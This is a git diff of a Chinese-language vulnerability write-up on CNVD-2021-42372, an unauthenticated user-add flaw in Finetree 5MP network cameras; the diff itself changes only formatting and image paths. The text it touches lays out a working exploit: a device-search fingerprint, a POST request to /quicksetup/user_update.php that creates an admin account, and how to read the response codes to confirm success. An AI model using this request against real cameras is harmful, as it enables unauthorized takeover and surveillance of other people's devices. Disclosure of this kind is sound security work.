@@ -1,8 +1,8 @@
-# Finetree 5MP 摄像机 user_pop.php 任意用户添加漏洞 CNVD-2021-42372
+# Finetree 5MP 摄像机 user\_pop.php 任意用户添加漏洞 CNVD-2021-42372
 
 ## 漏洞描述
 
-Finetree 5MP 摄像机 user_pop.php文件存在未授权任意用户添加，攻击者添加后可以获取后台权限
+Finetree 5MP 摄像机 user\_pop.php文件存在未授权任意用户添加，攻击者添加后可以获取后台权限
 
 ## 漏洞影响
 
@@ -21,11 +21,11 @@ app="Finetree-5MP-Network-Camera"
 
 登录页面
 
-![image-20220519162837184](images/202205191628247.png)
+![image-20220519162837184](../.gitbook/assets/202205191628247.png)
 
-存在漏洞的文件 user_pop.php
+存在漏洞的文件 user\_pop.php
 
-![image-20220519163003628](images/202205191630679.png)
+![image-20220519163003628](../.gitbook/assets/202205191630679.png)
 
 ```
 POST /quicksetup/user_update.php HTTP/1.1
@@ -43,12 +43,12 @@ method=add&user=admin1234&pwd=admin1234&group=2&ptz_enable=0
 
 可以Burpsuite发送POST请求
 
-![image-20220519163205310](images/202205191632366.png)
+![image-20220519163205310](../.gitbook/assets/202205191632366.png)
 
 或者HackBar发送POST请求，返回200即为添加成功，返回804则为用户重复
 
-![image-20220519163124031](images/202205191631102.png)
+![image-20220519163124031](../.gitbook/assets/202205191631102.png)
 
 利用添加的账户可以登录后台
 
-![image-20220519163442946](images/202205191634048.png)
+![image-20220519163442946](../.gitbook/assets/202205191634048.png)
